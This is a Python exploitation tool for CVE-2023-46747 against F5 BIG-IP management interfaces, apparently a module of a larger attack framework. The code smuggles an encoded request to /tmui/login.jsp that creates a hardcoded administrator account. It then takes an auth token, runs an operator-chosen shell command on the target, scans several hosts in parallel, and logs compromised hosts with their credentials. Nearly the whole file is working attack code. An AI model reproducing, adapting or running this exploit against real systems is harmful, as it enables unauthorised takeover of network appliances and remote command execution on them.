#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
from colorama import Fore, Style
import concurrent.futures
import binascii
import random
import json
import urllib3
import time
from pub.com.reqset import ReqSet

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

requests.packages.urllib3.disable_warnings()

username = "$pidey"
password = "$pideyhacked"

red = Fore.RED

green = Fore.GREEN

magenta = Fore.MAGENTA

cyan = Fore.CYAN

mixed = Fore.RED + Fore.BLUE

blue = Fore.BLUE

yellow = Fore.YELLOW

white = Fore.WHITE

reset = Style.RESET_ALL

bold = Style.BRIGHT

target_list = []

colors = [green, cyan, blue]

random_color = random.choice(colors)

class Cve_2023_46747Poc2:
    def banner(self):
        banner = f"""{bold}{random_color}

        ______     ____  __         _ ______
       / ____/  __/ __ \/ /  ____  (_)_  __/__  _____
      / __/ | |/_/ /_/ / /  / __ \/ / / / / _ \/ ___/
     / /____>  </ ____/ /__/ /_/ / / / / /  __/ /
    /_____/_/|_/_/   /_____|____/_/ /_/  \___/_/


                          Author   : D.SanjaiKumar @CyberRevoltSecurities

                          Github   : https://github.com/sanjai-AK47

                          LinkedIN : https://www.linkedin.com/in/d-sanjai-kumar-109a7227b/


        {reset}"""
        word = "                     Exploiter an Exploitation Tool for CVE-2023-46747\n"

        print(banner)
        print(word)


    def login_https(self,url):
        try:

            headers = {
                "User-Agent": self.header,
                "Content-Type": "application/x-www-form-urlencoded",
                "Transfer-Encoding": "chunked, chunked"
            }

            pass_url = url

            base_url = f"https://{url}"

            encode_data = "0008485454502f312e310000122f746d75692f436f6e74726f6c2f666f726d0000093132372e302e302e310000096c6f63616c686f73740000096c6f63616c686f7374000050000003000b546d75692d44756262756600000b424242424242424242424200000a52454d4f5445524f4c450000013000a00b00096c6f63616c686f73740003000561646d696e000501715f74696d656e6f773d61265f74696d656e6f775f6265666f72653d2668616e646c65723d253266746d756925326673797374656d25326675736572253266637265617465262626666f726d5f706167653d253266746d756925326673797374656d253266757365722532666372656174652e6a737025336626666f726d5f706167655f6265666f72653d26686964654f626a4c6973743d265f62756676616c75653d65494c3452556e537758596f5055494f47634f4678326f30305863253364265f62756676616c75655f6265666f72653d2673797374656d757365722d68696464656e3d5b5b2241646d696e6973747261746f72222c225b416c6c5d225d5d2673797374656d757365722d68696464656e5f6265666f72653d266e616d653d" + binascii.hexlify(
                username.encode()).decode() + "266e616d655f6265666f72653d267061737377643d" + binascii.hexlify(
                password.encode()).decode() + "267061737377645f6265666f72653d2666696e69736865643d782666696e69736865645f6265666f72653d00ff00"

            data = b"204\r\n" + binascii.unhexlify(encode_data) + b"\r\n0\r\n\r\n"

            if not url.startswith("http://") and not url.startswith("https://"):

                response = requests.post(f"{base_url}/tmui/login.jsp", data=data, timeout=self.timeout, verify=self.ssl,proxies=self.proxy, headers=headers)

                pass_url = base_url

            else:

                response = requests.post(f"{url}/tmui/login.jsp", data=data, timeout=self.timeout, verify=self.ssl,proxies=self.proxy,
                                         headers=headers)

                pass_url = url

            if response.status_code == 200:

                self.token(pass_url)

            else:

                print(
                    f"\n[{bold}{red}FAILED{reset}]: {bold}{white}Looks like target {url} not vulnerable to CVE-2023-46747 {reset}")




        except requests.exceptions.RequestException as e:

            self.login_http(pass_url)

        except KeyboardInterrupt as e:

            print(f"{bold}{bold} \nCTRL+C Pressed{reset}")

            return

        except Exception as e:

            pass


    def login_http(self,url):
        try:
            headers = {
                "User-Agent": self.header,
                "Content-Type": "application/x-www-form-urlencoded",
                "Transfer-Encoding": "chunked, chunked"
            }

            base_url = f"http://{url}"

            encoded_data = "0008485454502f312e310000122f746d75692f436f6e74726f6c2f666f726d0000093132372e302e302e310000096c6f63616c686f73740000096c6f63616c686f7374000050000003000b546d75692d44756262756600000b424242424242424242424200000a52454d4f5445524f4c450000013000a00b00096c6f63616c686f73740003000561646d696e000501715f74696d656e6f773d61265f74696d656e6f775f6265666f72653d2668616e646c65723d253266746d756925326673797374656d25326675736572253266637265617465262626666f726d5f706167653d253266746d756925326673797374656d253266757365722532666372656174652e6a737025336626666f726d5f706167655f6265666f72653d26686964654f626a4c6973743d265f62756676616c75653d65494c3452556e537758596f5055494f47634f4678326f30305863253364265f62756676616c75655f6265666f72653d2673797374656d757365722d68696464656e3d5b5b2241646d696e6973747261746f72222c225b416c6c5d225d5d2673797374656d757365722d68696464656e5f6265666f72653d266e616d653d" + binascii.hexlify(
                username.encode()).decode() + "266e616d655f6265666f72653d267061737377643d" + binascii.hexlify(
                password.encode()).decode() + "267061737377645f6265666f72653d2666696e69736865643d782666696e69736865645f6265666f72653d00ff00"
            data = b"204\r\n" + binascii.unhexlify(encoded_data) + b"\r\n0\r\n\r\n"

            if not url.startswith("http://") and not url.startswith("https://"):

                response = requests.post(f"{base_url}/tmui/login.jsp", data=data, timeout=self.timeout, verify=self.ssl,proxies=self.proxy, headers=headers)

                pass_url = base_url

            else:

                response = requests.post(f"{url}/tmui/login.jsp", data=data, timeout=self.timeout, verify=self.ssl,proxies=self.proxy,
                                         headers=headers)

                pass_url = url

            if response.status_code == 200:

                self.token(pass_url)

            else:

                print(
                    f"\n[{bold}{red}FAILED{reset}]: {bold}{white}Looks like target {url} not vulnerable to CVE-2023-46747 {reset}")

        except requests.exceptions.RequestException as e:
            print(f"\n[{bold}{red}OFFLINE{reset}]: {bold}{white}Failed looks target is {url}  offline{reset}")

            pass


        except KeyboardInterrupt as e:

            print(f"{bold}{bold} \nCTRL+C Pressed{reset}")

            return

        except Exception as e:

            pass


    def token(self,url):
        try:

            json = {
                "username": f"{username}",
                "password": f"{password}"
            }

            headers = {
                "User-Agent": self.header,
                "Content-Type": "application/json"
            }

            response = requests.post(f"{url}/mgmt/shared/authn/login", json=json, timeout=self.timeout, verify=self.ssl,proxies=self.proxy, headers=headers)

            if response.status_code == 200:

                tokens = json.loads(response.content.decode())["token"]["token"]

                token = tokens if self.token is not None else None

                if token != None:

                    self.executive_command(url, token)

                elif token == None:

                    print(
                        f"[{bold}{red}Authorization{reset}]: {bold}{white}Authentication for token failed for this credentials:\n[{bold}{blue}USERNAME{reset}]: {bold}{white}{username}{reset}\n[{bold}{blue}PASSWORD{reset}]: {bold}{white}{password}{reset}\n[{bold}{blue}TARGET{reset}]: {bold}{white}{url}{reset}")

                    pass

            else:

                print(
                    f"[{bold}{red}Authorization{reset}]: {bold}{white}Authentication for token failed for this credentials:\n[{bold}{blue}USERNAME{reset}]: {bold}{white}{username}{reset}\n[{bold}{blue}PASSWORD{reset}]: {bold}{white}{password}{reset}\n[{bold}{blue}TARGET{reset}]: {bold}{white}{url}{reset}")

                pass

        except KeyboardInterrupt as e:

            print(f"{bold}{bold} \nCTRL+C Pressed{reset}")

            return

        except Exception as e:

            pass


    def executive_command(self,url, token):
        try:
            headers = {
                "User-Agent": self.header,
                "X-F5-Auth-Token": token
            }

            rce = {
                "command": "run",
                "utilCmdArgs": f"-c \"{self.cmd}\""
            }

            response = requests.post(f"{url}/mgmt/shared/authn/login", json=rce, timeout=self.timeout, verify=self.ssl,proxies=self.proxy, headers=headers)

            if response.status_code == 200:

                commands = json.loads(response.content.decode())["commandResult"].replace("\\n", "")

                command = commands if commands is not None else None

                if command != None:

                    print(
                        f"[{bold}{green}Authorization{reset}]: {bold}{white}Command Execution successfull for this credentials:\n[{bold}{green}USERNAME{reset}]: {bold}{white}{username}{reset}\n[{bold}{green}PASSWORD{reset}]: {bold}{white}{password}{reset}\n[{bold}{green}TOKEN{reset}]: {token}\n[{bold}{green}TARGET{reset}]: {bold}{white}{url}{reset}\n")

                    print(f"[{bold}{green}EXPLOITED{reset}]: {bold}{white}{command}{reset}")

                    self.exploit_save(url, command)

                else:

                    print(
                        f"[{bold}{green}Authorization{reset}]: {bold}{white}Command Execution failed for this credentials:\n[{bold}{green}USERNAME{reset}]: {bold}{white}{username}{reset}\n[{bold}{green}PASSWORD{reset}]: {bold}{white}{password}{reset}\n[{bold}{green}TOKEN{reset}]: {token}\n[{bold}{green}TARGET{reset}]: {bold}{white}{url}{reset}\n")

                    print(
                        f"[{bold}{green}EXPLOITED{reset}]: {bold}{white}Sorry Unable to execute this command {command} , retry for exploitation")

                    self.exploit_save(url)


        except KeyboardInterrupt as e:

            print(f"{bold}{bold} \nCTRL+C Pressed{reset}")

            return

        except Exception as e:

            pass


    def exploit_save(self,url, response=None):
        try:
            filename = f"./result/bigIpResults.txt"

            with open(filename, "a") as w:
                w.write(
                    f"Vulneable Taget: {url} | Credentials: Username: {username} && Password: {password} | Exploited : [ {response} ]" + '\n')

        except KeyboardInterrupt as e:

            print(f"{bold}{bold} \nCTRL+C Pressed{reset}")

            return 
        except Exception as e:

            pass


    def speed_exploit(self,urls):
        try:

            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:

                futures = [executor.submit(self.login_https, url) for url in urls]

            concurrent.futures.wait(futures)

        except KeyboardInterrupt as e:

            print(f"{bold}{bold} CTRL+C Pressed{reset}")

            return

        except Exception as e:

            print(f"[{bold}{red}FAILED{reset}]: Error occured due to: {e}")


    def main(self,target):
        domain = target["domain"].strip("/ ")
        proxy = target["proxy"]
        self.ssl = target["ssl"]
        self.header = target["header"]
        self.timeout = int(target["timeout"])
        self.cmd = target["cmd"]

        _, self.proxy = ReqSet(proxy=proxy)
        try:

            self.banner()

        except KeyboardInterrupt as e:

            print(f"{bold}{bold} CTRL+C Pressed{reset}")

            return

        except Exception as e:

            print(f"[{bold}{red}FAILED{reset}]: Error occured due to: {e}")

        try:

            url = domain

            target_list.append(url)

            self.speed_exploit(target_list)


        except KeyboardInterrupt as e:

            print(f"{bold}{bold} CTRL+C Pressed{reset}")

            return

        except Exception as e:

            print(f"[{bold}{red}FAILED{reset}]: Error occured due to: {e}")



